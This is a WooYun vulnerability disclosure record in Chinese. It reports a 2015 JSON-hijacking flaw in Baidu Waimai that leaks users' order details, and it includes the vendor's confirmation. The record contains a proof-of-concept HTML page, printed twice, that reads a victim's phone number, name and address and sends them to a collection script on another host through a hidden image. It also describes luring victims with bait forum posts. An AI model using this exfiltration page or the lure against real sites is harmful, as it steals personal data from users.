{"id": 83936, "wybug_id": "wooyun-2015-0146285", "wybug_title": "百度外卖之订单信息泄漏", "wybug_corp": "百度", "wybug_author": "geegirl", "wybug_date": "2015-10-13 10:27", "wybug_open_date": "2015-11-27 10:48", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-27：\t细节向公众公开  简要描述： 哦哈哈有用妹子可用了。。。。虽然比较被动。（不是越权） 详细说明：  好吧，不是越权，是json劫持，这种问题在流量比较大的网站问题还比较严重！订单泄漏地址，手机，名字什么的都是小事。。json劫持，，不用多说了把，poc\n<html><head> <script>   var phone=\"\"; var name=\"\"; var addr=\"\"; var infos=\"\";function wooyun_callback(a){ eval(a);phone=a.result.data[0].user_phone;name=a.result.data[0].user_real_name;addr=a.result.data[0].user_address;infos=phone+\"||\"+name+\"||\"+addr;}</script><scriptsrc=\"http://waimai.baidu.com/waimai/trade/orderlist?type=list&display=json&page=1&callback=wooyun_callback\"></script><title>test</title></head><body><img id=\"img1\" src=\"1.jpg\" height=\"0\",width=\"0\"><img id=\"img2\" src=\"1.jpg\"><script>document.getElementById(\"img1\").src=\"http://192.168.1.104/r.php?info=\"+infos;</script></body></html>\n保存为html，然后上传到自己的服务器，之后就可以各种散播连接了，（服务端用php，很简单不啰嗦了）比如在贴吧发送xxx福利帖子，然后附上上面文件的连接，只要一点，就可以了。。点开后是女神的照片，可信息已经落入攻击者手中了。\n\n\n\n\n\n   漏洞证明：  好吧，不是越权，是json劫持，这种问题在流量比较大的网站问题还比较严重！订单泄漏地址，手机，名字什么的都是小事。。。。json劫持，，不用多说了把，poc\n<html><head> <script>   var phone=\"\"; var name=\"\"; var addr=\"\"; var infos=\"\";function wooyun_callback(a){ eval(a);phone=a.result.data[0].user_phone;name=a.result.data[0].user_real_name;addr=a.result.data[0].user_address;infos=phone+\"||\"+name+\"||\"+addr;}</script><scriptsrc=\"http://waimai.baidu.com/waimai/trade/orderlist?type=list&display=json&page=1&callback=wooyun_callback\"></script><title>test</title></head><body><img id=\"img1\" src=\"1.jpg\" height=\"0\",width=\"0\"><img id=\"img2\" src=\"1.jpg\"><script>document.getElementById(\"img1\").src=\"http://192.168.1.104/r.php?info=\"+infos;</script></body></html>\n保存为html，然后上传到自己的服务器，之后就可以各种散播连接了，（服务端用php，很简单不啰嗦了）比如在贴吧发送xxx福利帖子，然后附上上面文件的连接，只要一点，就可以了。。点开后是女神的照片，可信息已经落入攻击者手中了。\n\n\n\n\n\n   修复方案：  洞不大，可是有礼物吗？   版权声明：转载请注明来源 geegirl@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-10-13 10:46 厂商回复： 感谢提交！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-10-19 15:01 |    \t\t百度(乌云厂商)\t\t \n  hi，感谢反馈百度产品漏洞，百度安全应急响应中心现在正在开展百度产品众测活动，外卖也是众测产品之一，欢迎加入！可否留个QQ？    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}